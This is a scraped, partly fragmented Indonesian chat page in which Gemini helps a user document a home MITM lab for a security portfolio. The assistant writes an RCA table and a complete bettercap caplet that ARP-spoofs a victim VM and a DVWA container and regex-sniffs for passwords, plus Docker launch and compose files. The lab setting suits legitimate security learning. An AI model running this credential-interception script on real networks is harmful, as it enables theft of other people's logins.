_ngcontent-ng-c3259879534="" class="cdk-visually-hidden screen-reader-model-response-label ng-star-inserted">Gemini berkata</h2><!----><!----><structured-content-container _ngcontent-ng-c3259879534="" class="model-response-text processing-state-visible enable-2026q1-formatting-improvements ng-star-inserted has-thoughts" _nghost-ng-c3681030237="" style="height: auto;"><div _ngcontent-ng-c3681030237="" class="container"><message-content _ngcontent-ng-c3681030237="" _nghost-ng-c4270809962="" id="message-content-id-r_a6cb0fcf488bcd6d" class="ng-star-inserted"><div _ngcontent-ng-c4270809962="" inline-copy-host="" class="markdown markdown-main-panel stronger enable-updated-hr-color" style="--animation-duration: 400ms; --fade-animation-function: ease-out;" id="model-response-message-contentr_a6cb0fcf488bcd6d" aria-live="off" aria-busy="false" dir="ltr"><p data-path-to-node="0">Secara keseluruhan, <i data-path-to-node="0" data-index-in-node="20">README</i> ini <b data-path-to-node="0" data-index-in-node="31">LUAR BIASA BAGUS</b>. Susunannya sangat profesional, terstruktur rapi, dan sudah memenuhi standar repositori GitHub seorang <i data-path-to-node="0" data-index-in-node="151">Security Engineer</i> atau <i data-path-to-node="0" data-index-in-node="174">Penetration Tester</i> level industri.</p><p data-path-to-node="1">Kamu berhasil memasukkan elemen paling mahal dari sebuah portofolio: <b data-path-to-node="1" data-index-in-node="69">Root Cause Analysis (RCA)</b>. Perekrut tidak hanya ingin tahu apakah kamu bisa menjalankan <i data-path-to-node="1" data-index-in-node="157">tools</i>, tapi mereka ingin melihat <i data-path-to-node="1" data-index-in-node="190">bagaimana cara kamu memecahkan masalah saat tools itu gagal</i>. Tabel RCA kamu menunjukkan kemampuan <i data-path-to-node="1" data-index-in-node="288">problem-solving</i> tingkat tinggi.</p><p data-path-to-node="2">Namun, sebagai analis <i data-path-to-node="2" data-index-in-node="22">Quality Assurance</i> (QA) untuk tulisanmu, saya menemukan <b data-path-to-node="2" data-index-in-node="77">SATU KESALAHAN KRUSIAL</b> pada bagian teknis yang akan membuat serangan ini gagal jika ada orang lain yang meniru <i data-path-to-node="2" data-index-in-node="188">tutorial</i>-mu, ditambah beberapa saran <i data-path-to-node="2" data-index-in-node="225">polish</i> (poles) kecil agar lebih sempurna.</p><h3 data-path-to-node="3">🚨 1. KOREKSI KRUSIAL (Wajib Diperbaiki)</h3><p data-path-to-node="4">Coba perhatikan <b data-path-to-node="4" data-index-in-node="16">Langkah 6</b> dan <b data-path-to-node="4" data-index-in-node="30">Langkah 7</b> di <i data-path-to-node="4" data-index-in-node="43">README</i> kamu:</p><p data-path-to-node="5">Di Langkah 6, kamu menulis:</p><response-element class="" Ketika Ubuntu (.101) membuka DVWA (.20), datanya <b data-path-to-node="9" data-index-in-node="207">tidak akan tertangkap</b> karena <code data-path-to-node="9" data-index-in-node="236">.20</code> tidak masuk dalam daftar target <i data-path-to-node="9" data-index-in-node="272">spoofing</i>!</p><p data-path-to-node="10"><b data-path-to-node="10" data-index-in-node="0">Solusinya:</b> Ubah Di tabel RCA poin 7, kamu menulis akar masalahnya <code data-path-to-node="16,2,0" data-index-in-node="93">DVWA database not initialized</code>. Ini sangat akurat! Pengalamanmu tadi (hanya mendapat <code data-path-to-node="16,2,0" data-index-in-node="177">302 Found</code> tanpa melihat <i data-path-to-node="16,2,0" data-index-in-node="201">password</i>) terangkum sempurna di sini.</p></li></ul><h3 data-path-to-node="17">Kesimpulan</h3><p data-path-to-node="18">Setelah kamu merevisi target IP di Langkah 6, <i data-path-to-node="18" data-index-in-node="46">README</i> ini sudah <b data-path-to-node="18" data-index-in-node="63">100% siap untuk di-publish ke GitHub</b>. Ini adalah karya yang sangat solid. Kamu patut bangga!</p><p data-path-to-node="19">Apakah kamu ingin langsung <i data-path-to-node="19" data-index-in-node="27">commit</i> README ini, atau kita mau lanjut eksplorasi celah web seperti SQL Injection di DVWA?</p></div></message-content><!----></div></structured-content-container><!----><!----><!----><div _ngcontent-ng-c3259879534="" class="response-footer gap has-thoughts _ngcontent-ng-c3259879534="" class="cdk-visually-hidden screen-reader-model-response-label ng-star-inserted">Gemini berkata</h2><!----><!----><structured-content-container _ngcontent-ng-c3259879534="" class="model-response-text processing-state-visible enable-2026q1-formatting-improvements ng-star-inserted has-thoughts" _nghost-ng-c3681030237="" style="height: auto;"><div _ngcontent-ng-c3681030237="" class="container"><message-content _ngcontent-ng-c3681030237="" _nghost-ng-c4270809962="" id="message-content-id-r_8b74c618f1462606" class="ng-star-inserted"><div _ngcontent-ng-c4270809962="" inline-copy-host="" class="markdown markdown-main-panel stronger enable-updated-hr-color" style="--animation-duration: 400ms; --fade-animation-function: ease-out;" id="model-response-message-contentr_8b74c618f1462606" aria-live="off" aria-busy="false" dir="ltr"><p data-path-to-node="0">Kamu benar sekali! Murni kesalahan saya karena terlalu antusias mencatat <i data-path-to-node="0" data-index-in-node="73">setiap</i> pesan <i data-path-to-node="0" data-index-in-node="86">error</i> kecil yang muncul selama proses <i data-path-to-node="0" data-index-in-node="124">troubleshooting</i> kita tadi.</p><p data-path-to-node="1">Untuk sebuah portofolio profesional, kita memang <b data-path-to-node="1" data-index-in-node="49">tidak perlu</b> memasukkan hal-hal kecil seperti "lupa mematikan container lama" atau "salah ketik perintah eth0". Hal-hal itu adalah hal wajar yang dialami semua <i data-path-to-node="1" data-index-in-node="208">engineer</i> sehari-hari.</p><p data-path-to-node="2">RCA (Root Cause Analysis) yang bagus di GitHub sebaiknya hanya memuat <b data-path-to-node="2" data-index-in-node="70">masalah konseptual atau arsitektural utama</b> yang menunjukkan pemahaman teknis kamu.</p><p data-path-to-node="3">Jika kita peras intisarinya, sebenarnya kamu hanya menghadapi <b data-path-to-node="3" data-index-in-node="62">3 masalah inti</b> dalam lab ini. Berikut adalah revisi tabel RCA yang jauh lebih elegan, padat, dan terlihat sangat profesional untuk <code data-path-to-node="3" data-index-in-node="193">README.md</code> kamu:</p><hr data-path-to-node="4"><response-element class="" ng-version="0.0.0-PLACEHOLDER"><!----><!----><!----><!----><!----><!----><code-block _nghost-ng-c289529910="" class="ng-tns-c289529910-501 ng-star-inserted" style=""><!----><!----><div _ngcontent-ng-c289529910="" class="code-block ng-tns-c289529910-501 ng-animate-disabled ng-trigger ng-trigger-codeBlockRevealAnimation" jslog="223238;track:impression,attention;BardVeMetadataKey:[[&quot;r_8b74c618f1462606&quot;,&quot;c_636120df7a734bc3&quot;,null,&quot;rc_9ebc237e7bfff84d&quot;,null,null,&quot;id&quot;,null,1,null,null,1,0]]" style="display: block;" data-hveid="0" decode-data-ved="1" data-ved="0CAAQhtANahgKEwiHnaWq5YiUAxUAAAAAHQAAAAAQowo"><div _ngcontent-ng-c289529910="" class="code-block-decoration header-formatted gds-title-s ng-tns-c289529910-501 ng-star-inserted" style=""><span _ngcontent-ng-c289529910="" class="ng-tns-c289529910-501">Markdown</span><div _ngcontent-ng-c289529910="" class="buttons ng-tns-c289529910-501 ng-star-inserted"><button _ngcontent-ng-c289529910="" aria-label="Download kode" mat-icon-button="" mattooltip="Download kode" class="mdc-icon-button mat-mdc-icon-button mat-ripple-loader-centered=""><span class="mat-mdc-button-persistent-ripple mdc-icon-button__ripple"></span><mat-icon _ngcontent-ng-c289529910="" role="img" fonticon="download" class="mat-icon class="mat-focus-indicator"></span><span class="mat-mdc-button-touch-target"></span></button><!----><!----><!----><button _ngcontent-ng-c289529910="" aria-label="Salin kode" mat-icon-button="" class="mat-mdc-button-persistent-ripple mdc-icon-button__ripple"></span><mat-icon _ngcontent-ng-c289529910="" role="img" fonticon="content_copy" class="mat-icon notranslate gds-icon-s google-symbols class="mat-mdc-button-touch-target"></span></button><!----><!----></div><!----><!----></div><!----><div _ngcontent-ng-c289529910="" class="formatted-code-block-internal-container ng-tns-c289529910-501"><div _ngcontent-ng-c289529910="" class="animated-opacity ng-tns-c289529910-501"><pre _ngcontent-ng-c289529910="" class="ng-tns-c289529910-501"><code _ngcontent-ng-c289529910="" role="text" data-test-id="code-content" class="code-container formatted ng-tns-c289529910-501"><span class="hljs-section">## 🔍 Root Cause Analysis (RCA) — Core Challenges</span>

During the execution of this MITM attack, several architectural and behavioral obstacles were encountered and resolved.

| # | Technical Obstacle | Root Cause Concept | Resolution |
|---|--------------------|--------------------|------------|
| 1 | <span class="hljs-strong">**Host-to-Container Interception Failure**</span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span>(Same-Interface Routing Problem) | Running the spoofer directly on the Kali host caused packets to be dropped because VirtualBox (<span class="hljs-code">`vboxnet0`</span>) and the Linux kernel block traffic originating from and destined to the same interface. | <span class="hljs-strong">**Architectural Fix:**</span> Deployed Bettercap inside a <span class="hljs-strong">**Docker Macvlan**</span> container, granting it a dedicated, isolated MAC address on the network layer. |
| 2 | <span class="hljs-strong">**Spoofer Cannot Find Targets**</span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span>(Silent Network Environment) | Linux containers (like the DVWA target) do not broadcast background traffic. The Bettercap spoofer failed to build an ARP table because the target's MAC address was unknown. | <span class="hljs-strong">**Active Reconnaissance:**</span> Temporarily activated <span class="hljs-code">`net.probe on`</span> to send active discovery packets across the subnet, forcing the hidden container to respond and reveal its MAC address. |
| 3 | <span class="hljs-strong">**Missing HTTP POST Data**</span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span>(Session &amp; Caching Mechanisms) | Initial successful MITM interception only captured <span class="hljs-code">`HTTP 302`</span> redirects and <span class="hljs-code">`200 OK`</span> responses. The victim's browser was using an active <span class="hljs-code">`PHPSESSID`</span> cookie instead of sending a new POST login request. | <span class="hljs-strong">**Session Invalidation &amp; Deep Sniffing:**</span> Cleared browser cookies/used Incognito mode to force a fresh authentication request, and configured Bettercap with <span class="hljs-code">`net.sniff.verbose`</span> and custom regex (<span class="hljs-code">`.*password=.*`</span>) to capture the raw payload. |
</code></pre><!----></div></div></div><!----><!----><!----></code-block><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----></response-element><hr data-path-to-node="6"><h3 data-path-to-node="7">Kenapa versi ini jauh lebih baik?</h3><ul data-path-to-node="8"><li><p data-path-to-node="8,0,0"><b data-path-to-node="8,0,0" data-index-in-node="0">Poin 1</b> memamerkan pemahamanmu tentang arsitektur jaringan (Macvlan vs Host).</p></li><li><p data-path-to-node="8,1,0"><b data-path-to-node="8,1,0" data-index-in-node="0">Poin 2</b> memamerkan pemahamanmu tentang cara kerja ARP dan "kebisuan" Docker <i data-path-to-node="8,1,0" data-index-in-node="75">container</i>.</p></li><li><p data-path-to-node="8,2,0"><b data-path-to-node="8,2,0" data-index-in-node="0">Poin 3</b> memamerkan pemahamanmu tentang cara kerja aplikasi web (Cookies/Sesi) dan konfigurasi <i data-path-to-node="8,2,0" data-index-in-node="93">sniffer</i> tingkat lanjut.</p></li></ul><p data-path-to-node="9">Hanya 3 poin, tapi langsung menunjukkan bahwa kamu paham <i data-path-to-node="9" data-index-in-node="57">Network Layer</i> (L2/L3) sekaligus <i data-path-to-node="9" data-index-in-node="89">Application Layer</i> (L7).</p><p data-path-to-node="10">Bagaimana menurutmu? Apakah 3 poin ini sudah pas merangkum perjuangan keras kita hari ini?</p></div></message-content><!----></div></structured-content-container><!----><!----><!----><div _ngcontent-ng-c3259879534="" class="ng-tns-c35387575-504 ng-star-inserted">Tampilkan alur berpikir</span><!----></div><div _ngcontent-ng-c35387575="" class="thoughts-header-button-icons ng-tns-c35387575-504"><!----><mat-icon class="mat-mdc-button-touch-target"></span></button></div><!----><!----></div></model-thoughts><!----></div><!----></div><!----></div><!----><!----><!----><!----><!----><!----><h2 _ngcontent-ng-c3259879534="" class="cdk-visually-hidden screen-reader-model-response-label ng-star-inserted">Gemini berkata</h2><!----><!----><structured-content-container _ngcontent-ng-c3259879534="" class="model-response-text processing-state-visible enable-2026q1-formatting-improvements ng-star-inserted has-thoughts" _nghost-ng-c3681030237="" style="height: auto;"><div _ngcontent-ng-c3681030237="" class="container"><message-content _ngcontent-ng-c3681030237="" _nghost-ng-c4270809962="" id="message-content-id-r_bef890ce71191c30" class="ng-star-inserted"><div _ngcontent-ng-c4270809962="" inline-copy-host="" class="markdown markdown-main-panel stronger enable-updated-hr-color" style="--animation-duration: 400ms; --fade-animation-function: ease-out;" id="model-response-message-contentr_bef890ce71191c30" aria-live="off" aria-busy="false" dir="ltr"><p data-path-to-node="0">Berdasarkan draf <code data-path-to-node="0" data-index-in-node="17">README.md</code> yang baru saja kita susun, judul utama untuk <i data-path-to-node="0" data-index-in-node="72">project</i> portofolio kamu adalah:</p><p data-path-to-node="1"><b data-path-to-node="1" data-index-in-node="0">"MITM Lab — Network Attack &amp; Detection Research"</b></p><p data-path-to-node="2">Judul ini sangat solid karena langsung menjelaskan apa yang kamu lakukan (MITM Lab) dan apa tujuan akademis/profesionalnya (Network Attack &amp; Detection Research).</p><p data-path-to-node="3">Namun, karena ini adalah mahakarya portofoliomu sendiri, kamu bebas menyesuaikannya! Jika kamu ingin menonjolkan aspek tertentu kepada perekrut, berikut adalah beberapa alternatif judul yang terdengar sangat profesional:</p><p data-path-to-node="4"><b data-path-to-node="4" data-index-in-node="0">Opsi 1: Menitikberatkan pada Infrastruktur (DevSecOps/Cloud Security)</b></p><blockquote data-path-to-node="5"><p data-path-to-node="5,0"><i data-path-to-node="5,0" data-index-in-node="0">"Mini Cyber Range: Dockerized MITM &amp; Web Exploitation Lab"</i>
<i data-path-to-node="5,0" data-index-in-node="59">(Ini menunjukkan bahwa kamu jago membuat infrastruktur lab sendiri menggunakan Docker).</i></p></blockquote><p data-path-to-node="6"><b data-path-to-node="6" data-index-in-node="0">Opsi 2: Sangat Spesifik dan Teknis (Network Security Engineer)</b></p><blockquote data-path-to-node="7"><p data-path-to-node="7,0"><i data-path-to-node="7,0" data-index-in-node="0">"Credential Harvesting Research via Docker Macvlan MITM"</i>
<i data-path-to-node="7,0" data-index-in-node="57">(Ini menunjukkan bahwa kamu paham teknik routing tingkat lanjut seperti Macvlan untuk eksekusi serangan).</i></p></blockquote><p data-path-to-node="8"><b data-path-to-node="8" data-index-in-node="0">Opsi 3: Lebih Luas &amp; Komprehensif (Penetration Tester)</b></p><blockquote data-path-to-node="9"><p data-path-to-node="9,0"><i data-path-to-node="9,0" data-index-in-node="0">"Network to Application: Full-Stack Vulnerability Assessment Lab"</i>
<i data-path-to-node="9,0" data-index-in-node="66">(Judul ini sangat cocok jika <i data-path-to-node="9,0" data-index-in-node="95">project</i> ini nantinya kamu gabungkan dengan serangan SQL Injection atau XSS di DVWA).</i></p></blockquote><p data-path-to-node="10">Menurutmu, mana yang paling menggambarkan <i data-path-to-node="10" data-index-in-node="42">personal branding</i> yang ingin kamu bangun di CV nanti? Atau kamu mau tetap pakai judul yang pertama?</p></div></message-content><!----></div></structured-content-container><!----><!----><!----><div _ngcontent-ng-c3259879534="" class="response-footer gap _ngcontent-ng-c3259879534="" class="cdk-visually-hidden screen-reader-model-response-label ng-star-inserted">Gemini berkata</h2><!----><!----><structured-content-container _ngcontent-ng-c3259879534="" class="model-response-text processing-state-visible enable-2026q1-formatting-improvements ng-star-inserted has-thoughts" _nghost-ng-c3681030237="" style="height: auto;"><div _ngcontent-ng-c3681030237="" class="container"><message-content _ngcontent-ng-c3681030237="" _nghost-ng-c4270809962="" id="message-content-id-r_9aefdc060c79ef4b" class="ng-star-inserted"><div _ngcontent-ng-c4270809962="" inline-copy-host="" class="markdown markdown-main-panel stronger enable-updated-hr-color" style="--animation-duration: 400ms; --fade-animation-function: ease-out;" id="model-response-message-contentr_9aefdc060c79ef4b" aria-live="off" aria-busy="false" dir="ltr"><p data-path-to-node="0">Ini adalah langkah yang sangat teliti. Membuat <i data-path-to-node="0" data-index-in-node="47">caplet</i> (script otomasi) akan sangat menghemat waktu jika sewaktu-waktu lab ini di-<i data-path-to-node="0" data-index-in-node="129">restart</i>, sehingga kamu tidak perlu mengetik ulang perintah satu per satu.</p><p data-path-to-node="1">Berdasarkan hasil <i data-path-to-node="1" data-index-in-node="18">troubleshooting</i> kita yang paling sukses, ada <b data-path-to-node="1" data-index-in-node="63">tiga perbaikan utama</b> yang harus dilakukan pada <i data-path-to-node="1" data-index-in-node="110">caplet</i> kamu:</p><ol start="1" data-path-to-node="2"><li><p data-path-to-node="2,0,0"><b data-path-to-node="2,0,0" data-index-in-node="0">Koreksi Komentar Target:</b> Di komentar kamu tertulis Metasploitable (<code data-path-to-node="2,0,0" data-index-in-node="67">.102</code>), tapi perintah aslinya menggunakan DVWA (<code data-path-to-node="2,0,0" data-index-in-node="114">.20</code>). Kita harus menyamakan komentar dengan perintah agar tidak membingungkan orang yang membaca repositorimu.</p></li><li><p data-path-to-node="2,1,0"><b data-path-to-node="2,1,0" data-index-in-node="0">Mematikan Radar (Probe):</b> <code data-path-to-node="2,1,0" data-index-in-node="25">net.probe on</code> akan terus-menerus membanjiri jaringan dengan paket pencarian. Praktik yang baik adalah menyalakannya sebentar (<code data-path-to-node="2,1,0" data-index-in-node="150">sleep 5</code>), lalu langsung mematikannya (<code data-path-to-node="2,1,0" data-index-in-node="188">net.probe off</code>) sebelum mulai menyadap agar log tidak kotor.</p></li><li><p data-path-to-node="2,2,0"><b data-path-to-node="2,2,0" data-index-in-node="0">Memasukkan Konfigurasi "Deep Sniffing":</b> Kita masukkan konfigurasi <i data-path-to-node="2,2,0" data-index-in-node="66">brutal/bulletproof</i> (mematikan parser HTTP dan menggunakan regex) yang terbukti sukses menangkap <i data-path-to-node="2,2,0" data-index-in-node="162">password</i> mentah di kasus jaringanmu.</p></li></ol><p data-path-to-node="3">Berikut adalah versi <code data-path-to-node="3" data-index-in-node="21">bettercap.caplet</code> yang sudah direvisi dan disempurnakan untuk portofoliomu:</p><response-element class="" ng-version="0.0.0-PLACEHOLDER"><!----><!----><!----><!----><!----><!----><code-block _nghost-ng-c289529910="" class="ng-tns-c289529910-520 ng-star-inserted" style=""><!----><!----><div ng-tns-c289529910-520"><div _ngcontent-ng-c289529910="" class="animated-opacity ng-tns-c289529910-520"><pre _ngcontent-ng-c289529910="" class="ng-tns-c289529910-520"><code _ngcontent-ng-c289529910="" role="text" data-test-id="code-content" class="code-container formatted ng-tns-c289529910-520"># ============================================================
# bettercap.caplet — Automated MITM Attack Script
#
# Usage (inside bettercap container):
#   bettercap -iface eth0 -caplet /app/bettercap.caplet
#
# Targets:
#   192.168.56.101  — Ubuntu VM (Victim)
#   192.168.56.20   — DVWA Container (Target Server)
# ============================================================

# --- 1. Discovery (Pemanasan Jaringan) ---
# Memaksa spoofer untuk menemukan MAC Address target yang bersembunyi
net.probe on
sleep 5
net.probe off

# --- 2. ARP Spoof Configuration ---
# Menjebak lalu lintas bolak-balik antara Ubuntu dan DVWA
set arp.spoof.fullduplex true
set arp.spoof.internal   true
set arp.spoof.targets    192.168.56.101,192.168.56.20

# --- 3. Sniffer Configuration (Deep Capture) ---
# Mematikan HTTP parser bawaan dan menggunakan Regex agar payload 
# form POST (username &amp; password) tertangkap mentah tanpa terpotong
set net.sniff.filter     ""
set net.sniff.http       false
set net.sniff.verbose    true
set net.sniff.regexp     .*password=.*

# --- 4. Start Attack ---
arp.spoof on
net.sniff on
</code></pre><!----></div></div></div><!----><!----><!----></code-block><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----></response-element><h3 data-path-to-node="5">💡 Catatan Eksekusi di Docker</h3><p data-path-to-node="6">Jika kamu ingin menjalankan <i data-path-to-node="6" data-index-in-node="28">caplet</i> ini secara otomatis saat membuat <i data-path-to-node="6" data-index-in-node="68">container</i>, kamu harus melakukan <i data-path-to-node="6" data-index-in-node="100">mount</i> (menempelkan) <i data-path-to-node="6" data-index-in-node="120">file</i> ini dari Kali fisikmu ke dalam <i data-path-to-node="6" data-index-in-node="156">container</i>.</p><p data-path-to-node="7">Misalnya, jika <i data-path-to-node="7" data-index-in-node="15">file</i> <code data-path-to-node="7" data-index-in-node="20">bettercap.caplet</code> ini kamu simpan di folder <code data-path-to-node="7" data-index-in-node="63">/home/miftahul/mitm-lab/docker/</code>, maka perintah jalannya menjadi:</p><response-element class="" ng-version="0.0.0-PLACEHOLDER"><!----><!----><!----><!----><!----><!----><code-block _nghost-ng-c289529910="" class="ng-tns-c289529910-521 ng-star-inserted" style=""><!----><!----><div ng-tns-c289529910-521"><div _ngcontent-ng-c289529910="" class="animated-opacity ng-tns-c289529910-521"><pre _ngcontent-ng-c289529910="" class="ng-tns-c289529910-521"><code _ngcontent-ng-c289529910="" role="text" data-test-id="code-content" class="code-container formatted ng-tns-c289529910-521">docker run -it --rm \
  --name attacker \
  --network mitm-net \
  --ip 192.168.56.10 \
  --cap-add NET_ADMIN \
  --cap-add NET_RAW \
  -v /home/miftahul/mitm-lab/docker/bettercap.caplet:/app/bettercap.caplet \
  bettercap/bettercap \
  -iface eth0 -caplet /app/bettercap.caplet
</code></pre><!----></div></div></div><!----><!----><!----></code-block><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----></response-element><p _ngcontent-ng-c3259879534="" class="cdk-visually-hidden screen-reader-model-response-label ng-star-inserted">Gemini berkata</h2><!----><!----><structured-content-container _ngcontent-ng-c3259879534="" class="model-response-text processing-state-visible enable-2026q1-formatting-improvements ng-star-inserted has-thoughts" _nghost-ng-c3681030237="" style="height: auto;"><div _ngcontent-ng-c3681030237="" class="container"><message-content _ngcontent-ng-c3681030237="" _nghost-ng-c4270809962="" id="message-content-id-r_419dd308e2519766" class="ng-star-inserted"><div _ngcontent-ng-c4270809962="" inline-copy-host="" class="markdown markdown-main-panel stronger enable-updated-hr-color" style="--animation-duration: 400ms; --fade-animation-function: ease-out;" id="model-response-message-contentr_419dd308e2519766" aria-live="off" aria-busy="false" dir="ltr"><p data-path-to-node="0">Secara struktur (<i data-path-to-node="0" data-index-in-node="17">syntax</i> YAML) dan logika konfigurasi Docker Macvlan, <i data-path-to-node="0" data-index-in-node="69">file</i> <code data-path-to-node="0" data-index-in-node="74">docker-compose.yml</code> kamu <b data-path-to-node="0" data-index-in-node="98">sudah 100% benar dan sangat rapi</b>. Penggunaan <code data-path-to-node="0" data-index-in-node="143">external: true</code> dan penetapan <code data-path-to-node="0" data-index-in-node="172">ipv4_address</code> statis sudah tepat sasaran.</p><p data-path-to-node="1">Namun, sebagai analis, saya menemukan <b data-path-to-node="1" data-index-in-node="38">satu "jebakan" logis</b> yang sering menjebak orang saat menggunakan jaringan Macvlan, dan itu berkaitan dengan catatan akses (URL) di dalam komentar kamu.</p><h3 data-path-to-node="2">🚨 Koreksi Krusial: Port Asli Container</h3><p data-path-to-node="3">Karena kamu menggunakan <b data-path-to-node="3" data-index-in-node="24">Macvlan</b>, <i data-path-to-node="3" data-index-in-node="33">container</i> ini mendapatkan IP mereka sendiri dan bertindak seperti mesin fisik di jaringan. Artinya, Docker <b data-path-to-node="3" data-index-in-node="140">tidak</b> melakukan <i data-path-to-node="3" data-index-in-node="156">port forwarding</i> (seperti <code data-path-to-node="3" data-index-in-node="181">80:3000</code>). Kamu harus mengakses aplikasi tersebut menggunakan <b data-path-to-node="3" data-index-in-node="242">port bawaan (native port)</b> masing-masing.</p><ol start="1" data-path-to-node="4"><li><p data-path-to-node="4,0,0"><b data-path-to-node="4,0,0" data-index-in-node="0">DVWA:</b> Bawaannya berjalan di port <code data-path-to-node="4,0,0" data-index-in-node="33">80</code> (HTTP). Jadi URL <code data-path-to-node="4,0,0" data-index-in-node="53">http://192.168.56.20</code> sudah benar.</p></li><li><p data-path-to-node="4,1,0"><b data-path-to-node="4,1,0" data-index-in-node="0">WebGoat:</b> Secara <i data-path-to-node="4,1,0" data-index-in-node="16">default</i> berjalan di port <b data-path-to-node="4,1,0" data-index-in-node="41"><code data-path-to-node="4,1,0" data-index-in-node="41">8080</code></b>. Jadi, jika kamu hanya mengakses <code data-path-to-node="4,1,0" data-index-in-node="79">http://192.168.56.21/WebGoat</code>, <i data-path-to-node="4,1,0" data-index-in-node="109">browser</i> akan mencari port 80 dan gagal terhubung.</p></li><li><p data-path-to-node="4,2,0"><b data-path-to-node="4,2,0" data-index-in-node="0">Juice Shop:</b> Secara <i data-path-to-node="4,2,0" data-index-in-node="19">default</i> berjalan di port <b data-path-to-node="4,2,0" data-index-in-node="44"><code data-path-to-node="4,2,0" data-index-in-node="44">3000</code></b>. Mengakses <code data-path-to-node="4,2,0" data-index-in-node="60">http://192.168.56.22</code> akan memunculkan <i data-path-to-node="4,2,0" data-index-in-node="98">error connection refused</i>.</p></li></ol><h3 data-path-to-node="5">✨ Versi Revisi yang Disempurnakan</h3><p data-path-to-node="6">Saya telah merevisi bagian komentar <i data-path-to-node="6" data-index-in-node="36">Access</i> agar kamu tidak kebingungan saat mencoba membukanya nanti di Ubuntu VM.</p><p data-path-to-node="7">(Saya juga memperhatikan sebelumnya kamu menggunakan image <code data-path-to-node="7" data-index-in-node="59">webgoat/webgoat:latest</code> di log <code data-path-to-node="7" data-index-in-node="89">docker ps</code>, tapi di sini kamu menulis <code data-path-to-node="7" data-index-in-node="126">webgoat/goat-and-wolf</code>. Keduanya valid, tapi <code data-path-to-node="7" data-index-in-node="170">goat-and-wolf</code> lebih berat karena menggabungkan fitur WebWolf. Saya kembalikan ke versi standarnya agar lab kamu lebih ringan, kecuali kamu memang butuh WebWolf).</p><p data-path-to-node="8">Berikut versi finalnya yang siap kamu <i data-path-to-node="8" data-index-in-node="38">commit</i>:</p><response-element class="" ng-version="0.0.0-PLACEHOLDER"><!----><!----><!----><!----><!----><!----><code-block _nghost-ng-c289529910="" class="ng-tns-c289529910-531 ng-star-inserted" style=""><!----><!----><div _ngcontent-ng-c289529910="" class="code-block ng-tns-c289529910-531 ng-animate-disabled ng-trigger ng-trigger-codeBlockRevealAnimation" jslog="223238;track:impression,attention;BardVeMetadataKey:[[&quot;r_419dd308e2519766&quot;,&quot;c_636120df7a734bc3&quot;,null,&quot;rc_d6ad1f57405c5de6&quot;,null,null,&quot;id&quot;,null,1,null,null,1,0]]" style="display: block;" data-hveid="0" decode-data-ved="1" data-ved="0CAAQhtANahgKEwiHnaWq5YiUAxUAAAAAHQAAAAAQ4Qo"><div _ngcontent-ng-c289529910="" class="code-block-decoration header-formatted gds-title-s ng-tns-c289529910-531 ng-star-inserted" style=""><span _ngcontent-ng-c289529910="" class="ng-tns-c289529910-531">YAML</span><div _ngcontent-ng-c289529910="" class="buttons class="mat-mdc-button-persistent-ripple mdc-icon-button__ripple"></span><mat-icon _ngcontent-ng-c289529910="" role="img" fonticon="content_copy" class="mat-icon notranslate gds-icon-s google-symbols class="mat-mdc-button-touch-target"></span></button><!----><!----></div><!----><!----></div><!----><div _ngcontent-ng-c289529910="" class="formatted-code-block-internal-container ng-tns-c289529910-531"><div _ngcontent-ng-c289529910="" class="animated-opacity ng-tns-c289529910-531"><pre _ngcontent-ng-c289529910="" class="ng-tns-c289529910-531"><code _ngcontent-ng-c289529910="" role="text" data-test-id="code-content" class="code-container formatted ng-tns-c289529910-531"><span class="hljs-attr">version:</span> <span class="hljs-string">"3.8"</span>

<span class="hljs-comment"># ============================================================</span>
<span class="hljs-comment"># MITM Lab — Target Containers</span>
<span class="hljs-comment"># Network: macvlan (mitm-net) — must be created first</span>
<span class="hljs-comment">#</span>
<span class="hljs-comment"># Pre-requisite:</span>
<span class="hljs-comment">#   docker network create \</span>
<span class="hljs-comment">#     --driver macvlan \</span>
<span class="hljs-comment">#     --subnet=192.168.56.0/24 \</span>
<span class="hljs-comment">#     --gateway=192.168.56.1 \</span>
<span class="hljs-comment">#     --opt parent=vboxnet0 \</span>
<span class="hljs-comment">#     mitm-net</span>
<span class="hljs-comment"># ============================================================</span>

<span class="hljs-attr">networks:</span>
  <span class="hljs-attr">mitm-net:</span>
    <span class="hljs-attr">external:</span> <span class="hljs-literal">true</span>   <span class="hljs-comment"># created manually with macvlan driver</span>

<span class="hljs-attr">services:</span>

  <span class="hljs-comment"># ----------------------------------------------------------</span>
  <span class="hljs-comment"># DVWA — Damn Vulnerable Web Application</span>
  <span class="hljs-comment"># Access: http://192.168.56.20</span>
  <span class="hljs-comment"># Native Port: 80</span>
  <span class="hljs-comment"># Login:  admin / password (after running setup.php)</span>
  <span class="hljs-comment"># ----------------------------------------------------------</span>
  <span class="hljs-attr">dvwa:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">vulnerables/web-dvwa</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">dvwa</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-attr">mitm-net:</span>
        <span class="hljs-attr">ipv4_address:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.20</span>
